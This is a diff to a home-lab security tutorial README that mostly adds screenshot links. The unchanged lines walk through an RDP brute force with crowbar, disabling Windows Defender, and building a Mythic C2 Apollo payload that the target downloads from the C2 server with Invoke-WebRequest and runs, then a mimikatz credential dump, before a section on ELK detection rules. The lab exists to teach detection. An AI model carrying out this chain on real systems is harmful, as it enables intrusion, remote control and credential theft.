@@ -790,7 +790,7 @@ In this section, we will set up Mythic C2, a Command and Control framework that 
 
 ### Diagram Overview
 
-*Insert your diagram here that outlines the C2 setup process.*
+![Mythicdiagram](Screenshots/MythicDiagram.png).
 
 ### Phases of the C2 Setup
 
@@ -900,9 +900,16 @@ apt-get update && apt-get upgrade -y
      cat .env # To view username and password
      ```
 
+![lsenv](Screenshots/Mythicpasswordcat.png).
+
+![catenv](Screenshots/Mythicpassword.png).
+
 3. **Sign In**:
    - Use the retrieved credentials to sign into the Mythic web portal.
 
+![mythicpassword](Screenshots/MythicSigninafterpassword.png).
+
+![mythiclandingpage](Screenshots/MythicSigninafterpassword2.png).
 
 Mythic C2 is now set up and ready for use.
 
@@ -914,6 +921,8 @@ Navigate to the Administrator user and create a folder named `TopSecret`. Create
 ```
 C:\Users\Administrator\TopSecret
 ```
+
+![fakepassword](Screenshots/Winserverfakepassword.png).
 
 ### 2. Setting the Administrator Password:
 Set the Administrator user password on the target Windows server to `S3cr3tp@s5w0rd`.
@@ -927,9 +936,13 @@ mkdir ~/Desktop/Mythic
 
 We can create a text file with 50 fake passwords and put the administrator password we just created on the last row. This way, our command will try the 50 bad passwords first and then successfully RDP brute force with the good password on the 51st try. Or, we can copy a password wordlist from Kali Linux. Let's choose one that is not too big, such as `2023-200_most_used_passwords.txt`.
 
+![Wordlist](Screenshots/KaliWordlist.png).
+
 ```bash
 cp /usr/share/wordlists/seclists/SecLists-master/Passwords/2023-200_most_used_passwords.txt ~/Desktop/Mythic/password.txt
 ```
+
+![copywordlist](Screenshots/KaliWordlist2.png).
 
 This command copies the wordlist to the new directory and renames it to `password.txt`
 
@@ -964,6 +977,8 @@ crowbar -b rdp -u Administrator -C password.txt -s 199.247.5.216/32
 - `-C` is the password list.
 - `-s` is the target Windows server IP address (the `/32` targets ONLY this IP address).
 
+![adminpasswordRDP](Screenshots/KaliWordlist3.png).
+
 ### 5. RDP into Target Windows Server:
 Use xfreerdp to connect via RDP:
 
@@ -971,10 +986,13 @@ Use xfreerdp to connect via RDP:
 xfreerdp /u:Administrator /p:S3cr3tp@s5w0rd /v:199.247.5.216:3389
 ```
 
-`-b` specifies the service.  
-`-u` is the user account.  
-`-C` is the password list.  
-`s` is the target Windows server IP address (the `/32` targets ONLY this IP address).
+`-u` specifies the user account.  
+`-p` is the password for the user account.  
+`-V` is the target Windows server IP address (including the port number).  
+
+![xfreerdp(Screenshots/KaliXfreeRDP.png).
+
+![rdpconnected](Screenshots/KaliXfreeRDP2.png).
 
 Once connected, let's open CMD and run some discovery commands. We are doing this to simulate what attackers usually do when they gain access to a machine.
 
@@ -988,8 +1006,12 @@ net use
 ipconfig /all
 ```
 
+![discovery](Screenshots/KaliXfreeRDP3Discover.png).
+
 ### 6. Disabling Windows Defender:
 Disable Windows Defender from the target server.
+
+![disabledefender](Screenshots/KaliXfreeRDP4dissableDefender.png).
 
 ### 7. Building Mythic C2 Agent (Apollo):
 SSH into the Mythic Server and install the Apollo agent:
@@ -998,14 +1020,26 @@ SSH into the Mythic Server and install the Apollo agent:
 ./mythic-cli install github https://github.com/MythicAgents/Apollo
 ```
 
+![installapolo](Screenshots/Mythiccreateagent.png).
+
+![apollomythic](Screenshots/Mythiccreateagent2.png).
+
 Create a C2 profile using HTTP:
 
 ```bash
 ./mythic-cli install github https://github.com/MythicC2Profiles/http
 ```
 
+![c2profile](Screenshots/mythiccreateagent3.png).
+
+![c2profilemythic](Screenshots/Mythiccreateagent4http.png).
+
 ### 8. Creating a New Payload:
 Generate a new payload from the Mythic web portal.
+
+![payload](Screenshots/mythicpayload.png).
+
+![payload2](Screenshots/mythicpayload2.png).
 
 Modify the callback host to the Mythic server's public IP address:
 
@@ -1013,11 +1047,17 @@ Modify the callback host to the Mythic server's public IP address:
 http://45.77.53.41
 ```
 
+![modifypayload](Screenshots/mythicpayload6IP.png).
+
 Download the payload on the Mythic server:
+
+![downloadpayload](Screenshots/mythicpayload7download.png).
 
 ```bash
 wget https://45.77.53.41:7443/direct/download/34ce1813-32d4-484f-99c3-2633a9ea7cb9 --no-check-certificate
 ```
+
+![download2]({Screenshots/mythicpayload8download2.png).
 
 Since it creates a very long filename (`34ce1813-32d4-484f-99c3-2633a9ea7cb9`), let's rename it to `apollo.exe` or any name you prefer with this command:
 
@@ -1025,7 +1065,11 @@ Since it creates a very long filename (`34ce1813-32d4-484f-99c3-2633a9ea7cb9`), 
 mv 34ce1813-32d4-484f-99c3-2633a9ea7cb9 apollo.exe
 ```
 
+![changename](Screenshots/mythicpayload9changename.png).
+
 Let's create a new directory and move the `apollo.exe` file inside it.
+
+![changedirectory](Screenshots/mythicpayload99makedir.png).
 
 ### 9. Setting Up HTTP Server and Downloading Payload:
 Start an HTTP server on the Mythic server:
@@ -1034,11 +1078,15 @@ Start an HTTP server on the Mythic server:
 python3 -m http.server 9999
 ```
 
+![httpserver9999](Screenshots/mythicpayload9999port.png).
+
 Download the payload on the target Windows server:
 
 ```powershell
 Invoke-WebRequest -Uri http://45.77.53.41:9999/Apollo/apollo.exe -OutFile "C:\Temp\apollo.exe"
 ```
+
+![invoke](Screenshots/mythicpayload.png99999Invoke.png).
 
 This command will look for our Mythic server on port 9999 and download `apollo.exe` into the Temp folder of the target Windows server. 
 
@@ -1049,9 +1097,13 @@ ufw allow 9999
 ufw allow 80
 ```
 
+![status200](Screenshots/mythicpayload9999status200.png).
+
 Now we should see status 200, indicating success.
 
 We can open File Explorer and verify that `apollo.exe` has been downloaded in the Temp folder of the target Windows server.
+
+![apollotemp](Screenshots/mythicpayload9999Temp.png).
 
 ### 10. Running the Payload and Establishing Command & Control:
 Run the payload in PowerShell:
@@ -1060,7 +1112,13 @@ Run the payload in PowerShell:
 .\apollo.exe
 ```
 
+![runapollo](Screenshots/mythicpayload9999Run.png).
+
+![netstat](Screenshots/MythicPayloadEstablished.png).
+
 Once we run it, we get a callback to our Mythic C2, allowing us to execute commands straight from Mythic. We can click on the telephone icon at the top ("Active callback") and then type in our commands at the bottom of the screen.
+
+![apollocallback](Screenshots/apollo3callback.png).
 
 Examples of commands we can run include:
 
@@ -1073,9 +1131,17 @@ screenshot
 mimikatz sekurlsa::logonpasswords 
 ```
 
+![command1](Screenshots/mythicpayloadcallback2.png).
+
+![whoami](Screenshots/mythicpayloadcallback4.png).
+
+![Screenshot](Screenshots/mythicpayloadcallback3.png).
+
+![mimikatz](Screenshots/mythicpayloadcallback.png).
+
 ## Creating Detection and Alert Rules in ELK for the Mythic C2 Apollo Agent
 
-In this section, we will create a detection and alert rule for the Mythic C2 Apollo agent, as well as build a dashboard with three tables.
+In this section, we will create a detection and alert rule for the Mythic C2 Apollo agent, as well as build a dashboard with 3 tables.
 
 ### Creating an Alert for the Mythic C2 in ELK
 
